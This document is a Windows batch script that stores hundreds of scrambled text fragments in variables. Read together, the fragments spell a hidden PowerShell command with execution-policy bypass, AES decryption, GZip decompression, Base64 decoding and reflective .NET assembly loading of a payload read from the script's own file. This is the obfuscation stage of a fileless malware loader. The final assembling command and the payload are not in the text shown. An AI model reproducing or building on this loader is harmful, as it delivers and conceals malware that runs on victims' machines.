@echo off
set "gMgnKYLEsy=we"
set "whXYqgkGCv=rs"
set "vDvvvLuwoj=co"
set "SfJHRNZYjI=0\"
set "YJmKoIYBtW=he"
set "qwkZOpicUq=do"
set "lUotiOBlug=\v"
set "VDgFhNQFDn=st"
set "WHxIFSxGUN=Po"
set "nQdsZylaCp=\W"
set "cvGLmQeHqY=.e"
set "LzfIpgqQfk= /"
set "zoLbDIrwVJ=nd"
set "YOsfrYxiIM=Sy"
set "JblcWhIaYJ=em"
set "pifmozGDOq=rS"
set "dfiOjXCqik=in"
set "SCihcFBEXi=ll"
set "mikmunacoN=:\"
set "lTRDOEjtGZ=1."
set "bEzFZSYTdy=ws"
set "XGudKRMmfX=32"
set "SjYzhctUxW=py"
set "TOqfLDKufA=xe"
set "OCcMhjnlzK=he"
set "crFKdUKLbS=s\"
set "jqRgSfZwXS=ll"
set "YcGGeevTBA=po"
set "SiczXINqWZ=Wi"
set "hOJJtsWrzr=y "
set "cNlZALfpeR= C"
set "owdVHQGdEJ=we"
set "FfrxWKZLfU=ow"
set "KCbcXMgBZV=cd"
set "TLroGSgVqI= %~dp0"
set "RVkyTqSstW=rofi"
set "UrvZlcaDJp=fUPr"
set "meyEzKYkQB=.Mem"
set "puHwcLeEio=).Sp"
set "oIjaWCmiRQ=esMa"
set "EoCdsDvHnc=e]::"
set "kCsQOothPU=Obje"
set "ILwUyWZzuk=form"
set "yTtENRvyxy=Comp"
set "yAcHlFRwjE=6esa"
set "eDqtulNctU=iiYG"
set "WsxwfxldMZ=le  "
set "nAwxzhwANy=Qec "
set "fdqRbnpvsk=RpY."
set "XhhhrOWAgF=fUPr"
set "OeswEmFqVf=tem."
set "YXZTCFFafB=.Cry"
set "zpMJMJCKmw=tem."
set "XupSqkxaMP=ion."
set "xuhyhxnvQC=ypto"
set "iguAJzfnDt=TllA"
set "pdTqkXcfWf=wyJz"
set "UWBMTVxWqJ=);$Q"
set "fIfycnvuAv=[-1."
set "nLMpBeZQtr=ddin"
set "QiYIRpIaSZ=y]::"
set "efJxqYXZso= '')"
set "NpFufbbIrs=HO3I"
set "JUkzlpbgxK=fore"
set "CZToFmeIJv=mory"
set "QpWWZEJDQg=onve"
set "PosWBHzIaZ=Secu"
set "lYiKxpuUZn=oryS"
set "lGPODnpHKB=  $H"
set "fALphZoNeQ=FcNh"
set "ktvevkaeRI=em.C"
set "ULGOxsBWak=('%~f0'"
set "xIMnuyziUr=gnir"
set "xRvjGwPSZv=and "
set "cnojzRitSP=m.Re"
set "pACFxKHHcZ=bypa"
set "gKVSWXcPgE=.Cre"
set "FXcLFFFSuf=ach "
set "YyxhUDTyOe=, $z"
set "WCwotFfyrM=hy.A"
set "LnPejcauhO=7kGw"
set "GJahWaQDDT=.IO."
set "bqgnuNbJGD=tsWi"
set "yBmopmydLk= '')"
set "vUdMLGlnyT=Q = "
set "kbZALxidHB=nirt"
set "QBsgfUjcMP=comp"
set "fNaujLDJcB=$HfU"
set "tumpGfFPTW=ode]"
set "MDpXDrlcba=:: '"
set "GKgBEFuNPv=$Qwy"
set "WDddkYDRZa=.Cop"
set "XqOiTFFLTF=);$H"
set "srlaUYhObx=('%*'"
set "FXiMJrXNuQ=($jr"
set "nBEjKDDJvS=em.I"
set "RjgvUjtLTf=ptog"
set "JDKrXGCTQW=zREX"
set "TjCivvNjEG=.Ass"
set "kpfAcbuFCr=pose"
set "wggCYflgWd=pres"
set "VQimHoLWxg===')"
set "rJgYSzbuIV=brea"
set "DQerGscoBK=Mode"
set "JYxJNxzbBJ=g = "
set "aBVaeqfplZ=oint"
set "GuYewjzjGt=th('"
set "OJVWblEQKi=($jr"
set "owLWYnNWSV=)($z"
set "NeaHfMOkGo=Syst"
set "IcsdyPxAqO== [S"
set "uTiqCYKYtm= [Sy"
set "RRUUKrqTZJ=Jz ="
set "yneLjavQvM=saBm"
set "qLtYwJiDaD=Stre"
set "yPUgAmWuig=:('g"
set "EDjGvYjAdU=[]] "
set "QbSUkQuOxW=)))"
set "AeiWyZXsni=j = "
set "KqmeTzsnWY=::De"
set "sEYVrJWCkF=ert]"
set "nxccVrtVHF=ress"
set "ZozrVemiDQ=ring"
set "KrSmHdhqnj=THxh"
set "qIXHHNvWRx=ck($"
set "JDJqSYfJLd=ionM"
set "yxdboZYoyZ=AykN"
set "mguJPeTPlD=iron"
set "MKcoiTSoHl=.GZi"
set "FaqaCBhuda='')("
set "QgDLTiAYAW=Jz);"
set "cDBXgGfUoE=ecry"
set "YYLuekaNYJ=stem"
set "sIzdiUqRrc=tS46"
set "qEcHmLdRFR=]::("
set "VlXtxDnJjn=kyhK"
set "yLLnOQGHIY=in $"
set "cQCYadBbTF=New-"
set "PDbMjzbGNq=$Ayk"
set "ZYuGOgOKCh=ress"
set "tWVwtvMyBI=1..-"
set "sFRrWeuZWN=ay()"
set "beAIIJedhq=oL'["
set "ctBptDSNiG=j, 0"
set "bzQoXpIeRR=BC;$"
set "EInEoTBnYx=m.IO"
set "ONttKlYjgy=bstr"
set "rkWrLeUHTq=.Mod"
set "MEcLVtqFxs=);$n"
set "CxCEMQuMQR=$Qwy"
set "uQxlmukgcq=2VUN"
set "skAHgkGSli=Obje"
set "PaPJQesPRM=RpY "
set "amZQMMQVQT=tem."
set "rOdenGcFMt=fUPr"
set "rFvvDgKgjz=vriS"
set "qBUUMGXsOC== $H"
set "wfEvQThqZM=IoO3"
set "sYtVRXEeex=c.En"
set "qrfepAuzAe=.Cry"
set "QfhaIJsxZg=ss -"
set "khzcgDjYMq=zREX"
set "MLBtaXEiIk=Conv"
set "offANnHpDy=nErJ"
set "YNbwPRdtQA=Invo"
set "WMmCXUYSeB=d;$H"
set "NMEoqzaoyv=tion"
set "NJsnDdpygd=ne);"
set "GsyDqkfRiC= = ["
set "QeTIMRYAcn=lBlo"
set "vmkKjYHikl=Disp"
set "XsFxkOeLnl=HfUP"
set "TnZtKcKMtn=yste"
set "DZpkYLGsIC=pher"
set "iUUwEHSTqP=ment"
set "cudZGDaEbp='[-1"
set "AUzYYfBnwP=sion"
set "kpccrTOrWX=uhK."
set "ntpMyOcvTf=join"
set "InLgKIwvum=Star"
set "ruTxgrYKUq=JP.D"
set "sVpEOtjGsS=();$"
set "hVhyQAdxuA=yste"
set "XZwynMeRuf=$vri"
set "prRHaPnkVn=Wyqo"
set "RFiNelmVdk=;$RL"
set "kWqLfousUr=m.IO"
set "GPLOTDxyLG=daeR"
set "iIEChtusNu=.Dis"
set "ZDNiFzfPNv=DNJS"
set "lQgwRarlif=Fina"
set "cSZCehcWFw=ct S"
set "wOGzYATtCt=fUPr"
set "dktzFfcRmh=S46e"
set "BbbWssjpOC=stem"
set "nPbIHcYIhl= if "
set "nauLMznSoa=.Com"
set "CfcGMKRLAT=morF"
set "lzrdoOzvTs=ing("
set "DSHPvdRMje=nage"
set "YVrvnQnEBb=Disp"
set "WtjKUQQqHG=7;$H"
set "ZLVpFwXWGh=Bmor"
set "lWMopLeodo=trea"
set "CZIFIebPpH= = $"
set "eYkuPnGSqy=6] -"
set "MfNXjfeUpx=Xj ="
set "TunyJFWnpO=F'[-"
set "IerESnLMZg=rt]:"
set "YDpcczSiXt=ewLi"
set "omFJWEsNho=grap"
set "FvtKwntCLf=REXj"
set "FjcUDIlUyn=y.Ci"
set "FnSNyHyERM=lit("
set "WFEvVcxDZf=m(, "
set "BWDJEmsYEA=zREX"
set "wLHOsyrhWi=rtS4"
set "QhiSLZsYKh=V = "
set "hlSTeAnonj=fUPr"
set "XTBSTYmzjj=null"
set "BvBPpdnEXG=-joi"
set "jDravAvzgb=::('"
set "KSBwncZPlw=8kuY"
set "QChIMGGcXO=ptor"
set "SpTeOBVYLR=ke($"
set "MAPjbmupBB=ptog"
set "TNAhYdnnXF=yste"
set "KxxACbLEBV=Pr.I"
set "YYmpEKkUqf=-1.."
set "HTlyfPneop=flec"
set "nFQhmmzHlM=yTo("
set "UXeomfzWMA=]::N"
set "YCJLjhcfnd=ispo"
set "YRwSqrmAdT=t Sy"
set "GdHBhZBbcj=embl"
set "pxvfJozuRU=y.Cr"
set "yHnKmqsjpN=Xj);"
set "KQAisMZkEo='oPV"
set "UAyEqaBUZI=stem"
set "mYuPiKSbtB='txe"
set "EEEtjUZain=$Qwy"
set "bPTfEPFtiL=-nop"
set "zRQquIdeBj=hK.T"
set "QXcuySiOGC=zm83"
set "MtWLSalPqD= [Sy"
set "PRxsQdPOMa=pStr"
set "tRvLxEczPN=ose("
set "jTdwpdDAhB=.Con"
set "rmvshzcLYS=New-"
set "cyDziOtHhN=ddin"
set "nkPVexifhk=bjec"
set "NZAGmitBXz=esaB"
set "RUVxVyrccK=('da"
set "DtdpyOODBO=[Sys"
set "csIUTOPICY=] -j"
set "jDhdnxhfbl=..-1"
set "dnwQQtBwMG=eam("
set "lMNLhGMsZU=ect "
set "CTGTpFzCgZ=$zRE"
set "urSshySCSi=ct S"
set "mXzLoJwghU=SQ, "
set "ZyjFBdCbLp=Syst"
set "ldKUZjUJng=vert"
set "SYNsfdRvST=uhK "
set "XkULKCNApg=[Env"
set "arZONXzQoL=Secu"
set "FWsOxxADLv=r.Pa"
set "mvNshgNBtp=jrRp"
set "CvukaWuLjk=File"
set "KzuXfZevIY=)($H"
set "xqeEPgqfOl=ateD"
set "lESBbSIFTl=n ''"
set "bTpRPLPsjV=16] "
set "zVaaBTTGTO=P = "
set "FxcRCpbqyc=raph"
set "cTTiUhVOCX=);$S"
set "hryxRAUhrm=gMod"
set "UPCtaexcRD=pose"
set "ECGihIpOyL=comm"
set "MNqEPMijFI=-4] "
set "TnbPXQXtpT=dV1k"
set "SuAjWwmfEB=;$vr"
set "GuFCokKQyp=aDNK"
set "FSMMmRcfjL=ErJP"
set "IkaCBasCnJ=;$Si"
set "EmFqyzPwWk=O.Me"
set "HpvKWHeRSu=orF'"
set "xNSBuZhqXR=CuSj"
set "MdeLrHZQTf=;$xW"
set "SNybiuDCbQ=RLQe"
set "hQfrtlZYOD=ose("
set "pNBvMyolyP=[IO."
set "XZMNRvikHo= [st"
set "HkaBRaVpzo=;$xW"
set "KnolzSNeoJ=-Obj"
set "xIpHXuFJvk=rans"
set "NtpnQCvGdc=e = "
set "dFqyTasHuL=join"
set "HKqHbCYzYI=ew-O"
set "WOfNoSqzvP='gni"
set "lwCKPYgGSW=rity"
set "peKfkWhHnd=.Len"
set "yLHuNegcRz=[Sys"
set "iEvVeCmolc=k; }"
set "AVyyIzZUhR=REXj"
set "svBbnQvYee=Comp"
set "MMMueTlMwP=ress"
set "XtGYnQnyrJ=urit"
set "ioNyhSpytV=y.Pa"
set "pXoQCEKoaO=raph"
set "ZMxeHpgtTC= = $"
set "PwbRFNTtyO=NS ="
set "akYRcQiGIW=oin "
set "cdWhpNTThc=am;$"
